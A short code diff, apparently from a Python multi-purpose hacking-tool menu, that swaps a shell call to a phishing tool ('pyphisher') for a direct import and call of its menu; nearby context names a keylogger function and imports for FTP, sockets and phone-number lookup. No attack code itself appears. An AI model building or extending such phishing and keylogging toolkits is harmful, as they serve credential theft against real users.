@@ -7,6 +7,7 @@ import os
 import zipfile
 import tqdm
 import time
+from pyphisher.pyphisher import main_menu
 import socket
 import phonenumbers
 from phonenumbers import geocoder, carrier, timezone
@@ -26,6 +27,7 @@ import codecs
 import subprocess
 import string
 import random
+
 import re
 import ftplib
 from threading import Thread
@@ -218,7 +220,7 @@ def bi6():
             
             
     def pyPhisher():
-        os.system('pyphisher ')
+        main_menu()
         
     def keyLog():
         
